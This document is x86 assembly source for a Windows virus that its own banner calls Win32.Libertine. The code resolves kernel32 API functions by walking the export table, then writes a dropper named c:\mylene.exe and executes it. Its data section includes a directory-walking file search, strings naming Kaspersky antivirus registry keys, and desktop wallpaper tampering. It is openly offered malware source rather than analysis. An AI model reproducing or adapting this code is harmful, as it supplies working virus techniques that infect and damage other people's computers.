;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_18		proc	near
		cmp	byte ptr nt?,1
		je	short nt_d
		call	rndz
		retn
nt_d:
		xor	eax,dword ptr data_82
		retn
sub_18		endp

get_rnd		proc	near
		;random number
		pushad
		icall	GetTickCount
		xor	al,ah
		test	al,7
		popad
		retn
get_rnd		endp

                call $+5

kernel32	proc	near
		pop	ebp
		sub	ebp,1E36h
		add	esp,dword ptr ss:data_5e[ebp]
		cld
		mov	dword ptr ss:data_15[ebp],0
		mov	dword ptr ss:data_16[ebp],0
		; WIn95 kernel base 0BFF70000
		mov	esi,0BFF70000h
		mov	al,byte ptr [esp+3]
		cmp	al,0BFh
		je	short cur_9598
		;WinNT kernel base 077F00000
		mov	esi,77F00000h
cur_9598:
		; save kernel adress
		mov	edi,esi
		lodsd
		; check MZ header
		cmp	ax,5A4Dh	; "ZM"
		jne	s_exit
		add	esi,7Ch
		lodsd
		; check PE header
		cmp	eax,4550h	; "EP"
		jne	s_exit
		mov	edx,dword ptr [esi+74h]
;*		add	esi,0DCh
		db	 81h,0C6h,0DCh, 00h, 00h, 00h
nxt_s:
		add	esi,24h
		lodsd
		cmp	eax,edx
		jne	nxt_s
		lea	esi,[edi][eax]
		mov	ebx,esi
		mov	eax,dword ptr [esi+20h]
		lea	esi,[edi][eax]
		mov	dword ptr ss:data_17[ebp],esi
		mov	dword ptr ss:data_18[ebp],edi
loc_68:
		mov	ecx,dword ptr [ebx+18h]
loc_69:
		lodsd
		lea	edx,[edi][eax]
		pushad
		mov	esi,edx
		mov	edi,dword ptr ss:data_15[ebp]
		lea	edi,dword ptr data_19[edi][ebp]
		xor	edx,edx
		cld
loc_70:
		cmpsb
		jnz	short loc_71
		inc	edx
		jmp	short loc_70
loc_71:
		test	edx,edx
		jz	short loc_72
		cmp	byte ptr [esi-2],0
		jne	short loc_72
		cmp	byte ptr [edi-2],0
		jne	short loc_72
		mov	eax,dword ptr [ebx+18h]
		sub	eax,ecx
		shl	eax,1
		mov	esi,dword ptr [ebx+24h]
		add	esi,dword ptr ss:data_18[ebp]
		add	esi,eax
		xor	eax,eax
		lodsw
		mov	esi,dword ptr [ebx+1Ch]
		add	esi,dword ptr ss:data_18[ebp]
		mov	eax,[esi][eax*4]
		add	eax,dword ptr ss:data_18[ebp]
		mov	ecx,dword ptr ss:data_16[ebp]
		mov	dword ptr ss:createfileapi[ebp][ecx*4],eax
		sub	edi,1FC8h
		sub	edi,ebp
		mov	dword ptr ss:data_15[ebp],edi
		inc	dword ptr ss:data_16[ebp]
		popad
		mov	esi,dword ptr ss:data_17[ebp]
		jmp	loc_68
loc_72:
		popad
		cmp	dword ptr ss:data_16[ebp],4
		je	short ok_api
		loopd	short locloop_73

		jmp	short loc_74

locloop_73:
		jmp	loc_69
loc_74:
		jmp	short s_exit
ok_api:		; create & run dropper

		; create mylene.exe file
		push	dword ptr 0
		push	dword ptr 0
		push	dword ptr 2
		push	dword ptr 0
		push	dword ptr 3
		push	0C0000000h
		lea	eax,dword ptr ss:drop_[ebp]
		push	eax
		call	dword ptr ss:Createfileapi[ebp]
		mov	ebx,eax
		inc	eax
		jz	short s_exit
		; write mylene.exe file dropper code 
		push	dword ptr 0
		lea	eax,dword ptr ss:data_27[ebp]
		push	eax
		push	7BB8h
		lea	eax,dword ptr ss:data_4e[ebp]
		push	eax
		push	ebx
		call	dword ptr ss:Writefileapi[ebp]
		; close dropper
		push	ebx
		call	dword ptr ss:Closehandleapi[ebp]
		; run(exec) dropper file
		push	dword ptr 0
		lea	eax,dword ptr ss:drop_[ebp]
		push	eax
		call	dword ptr ss:Winexecapi[ebp]
s_exit:
		mov	eax,dword ptr ss:data_26[ebp]
		xor	eax,dword ptr ss:data_6e[ebp]
		jmp	eax			;*
                endp
                  
drop_		db	'c:\mylene.exe',0
data_15		dd	00000h
data_16		dd	00000h
data_17		dd	00000h
data_18		dd	00000h
data_19		db	'CreateFileA', 0
		db	'WriteFile', 0
		db	'CloseHandle', 0
		db	'WinExec',0
Createfileapi	dd	00000h
Writefileapi	dd	00000h
Closehandleapi	dd	00000h
Winexecapi	dd	00000h
data_26		dd	11223344h
data_27		dd	00000h

.data
		db	0Dh, 0Ah, '[Win32.Libertine v1.07b]', 0Dh, 0Ah
copyright	db	'Copyright 1998-xxxx by <NeverLoved>'
		db	0Dh, 0Ah, 'Mylene, I ',	3, ' U !', 0Dh, 0Ah
; exe header for com filez
                db     'MZ'
data_31		dw	0
data_32		dw	0
		db	 00h, 00h, 00h, 00h, 00h, 23h
		db	0FFh,0FFh, 00h, 00h, 40h, 03h
		db	 00h, 00h, 20h, 01h,0F0h,0FFh
		db	0, 0, 0, 0
data_34		dd	00000h

include loader.asb

		db	0B8h, 7Bh, 00h, 00h
data_35		dd	00000h
		db	0B8h, 7Bh
		db	0, 0
data_37		dd	00000h
		db	12 dup (0)
		db	 40h, 00h, 00h,0E0h
_disc		db	'C:\', 0
		db	'*.*', 0
		db	'..', 0
		db	'\avpichck.dll', 0
avpi		db	'AVPI32', 0
kaspersky	db	'.Default\Software\KasperskyLab\AVPI', 0
jpg_key	        db	'SOFTWARE\Microsoft\Shared Tools\Graphics Filters\Import\JPEG', 0
Path		db	'Path'
                db      0
_path:
		db	8 dup (0)
mylene_bmp	db	'C:\Mylene.bmp', 0
		db	'Control Panel\desktop', 0
tilewall	db	'TileWallpaper', 0
		db	'1',0,'ImportGr@16',0
mylene_exe      db      'mylene.exe sexy',0
data_42		dd	0012Ch
		db	 2Ch, 01h, 00h, 00h
data_43		db	0
		db	 42h, 4Dh, 26h, 7Dh, 02h, 00h
		db	 00h, 00h, 00h, 00h, 36h, 00h
		db	 00h, 00h
mylene_jpg:
                include mylene.asb
data_49		dd	00000h
data_50		dd	00000h
data_51		dd	00000h
data_52		dd	00000h
data_53		dd	00000h
		db	0, 0, 0, 0
data_55		dd	00000h
nt?		db	0
data_57		dd	00000h
data_58		dd	00000h
data_59		dd	00000h
data_60		db	0
data_61		dw	0
data_62		dd	00000h
data_63		dd	00000h
data_64		db	0
data_65		db	0
data_66		db	0
data_67		dd	00000h
		db	0, 0, 0, 0
data_68		db	0
data_69		db	0
data_70		dw	0
                dw      0
sub_21          dd      0 
		db	292 dup (0)

data_72		dd      ?
		db	211 dup (?)
data_73		db	?
data_74		dd	?
data_75		dd	?
data_76		dd	?
data_77		dd	?
		dd	?
data_78		dd	?
data_79		dd	?
data_80		dd	?
path		db	300 dup (?)
data_81		dd	?
		db	236 dup (?)
data_82		dd	?
		db	31460 dup (?)
data_83		dd	?
		db	1607 dup (?)
		db	?
		db	65535 dup (?)
		db	?
		db	1460 dup (?)
data_86		dd	?
		db	28 dup (?)
data_87		dd	?
		db	8 dup (?)
data_88		dd	?
		db	508 dup (?)
data_89		dd	?
		db	63515 dup (?)
		db	?
		db	65535 dup (?)
		db	?
		db	24576 dup (?)
		end	start
